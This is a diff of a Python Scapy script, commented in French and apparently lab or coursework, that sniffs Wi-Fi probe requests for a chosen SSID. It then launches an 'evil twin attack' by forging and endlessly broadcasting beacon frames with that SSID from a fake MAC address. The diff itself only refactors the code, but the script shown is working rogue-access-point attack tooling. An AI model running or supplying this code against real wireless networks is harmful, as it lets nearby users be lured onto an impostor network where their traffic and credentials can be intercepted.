@@ -10,12 +10,11 @@ from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, sniff
 import argparse
 from faker import Faker
 
-BROADCAST = "ff:ff:ff:ff:ff:ff"
+BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
 
-# Param nécessaire (à remplir) permettant de lancer le scan
-parser = argparse.ArgumentParser(prog="Scapy SSID finder", description="SSID scan in prob request")
-parser.add_argument("-i", "--interface", required=True, help="Interface to scan")
-parser.add_argument("-s", "--ssid", required=True, help="Resarched SSID")
+parser = argparse.ArgumentParser(prog="Scapy SSID finder", description="SSID scan in probe request")
+parser.add_argument("-i", "--interface", required=True, help="Interface to scan with")
+parser.add_argument("-s", "--ssid", required=True, help="SSID to look for")
 tab_args = parser.parse_args()
 
 ssid_found = False
@@ -33,10 +32,10 @@ def find_ssid(packet):
 
 # Propose de lancer une attaque evil twin si un SSID correspondant est trouvé
 def evil_twin_attack():
-    #Creation fausse MAC addresse
+    # Création fausse MAC addresse
     mac = Faker().mac_address()
-    #Forge le paquet (mac addresse fausse + ssid)
-    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST, addr2=mac, addr3=mac)
+    # On forge le paquet (fausse mac addresse + ssid)
+    dot11 = Dot11(type=0, subtype=8, addr1=BROADCAST_MAC, addr2=mac, addr3=mac)
     ssid = Dot11Elt(ID="SSID", info=tab_args.ssid, len=len(tab_args.ssid))
     frame = RadioTap()/dot11/Dot11Beacon()/ssid
 
@@ -44,6 +43,7 @@ def evil_twin_attack():
     sendp(frame, iface=tab_args.interface, loop=1)
 
 # On sniff le réseau sur l'interface choisie
-sniff(iface=tab_args.interface, prn=find_ssid, timeout=30)
-if ssid_found == False:
-    print("Aucun SSID n'a été trouvé")
+if __name__ == "__main__":
+    sniff(iface=tab_args.interface, prn=find_ssid, timeout=30)
+    if ssid_found == False:
+        print("Aucun SSID n'a été trouvé")
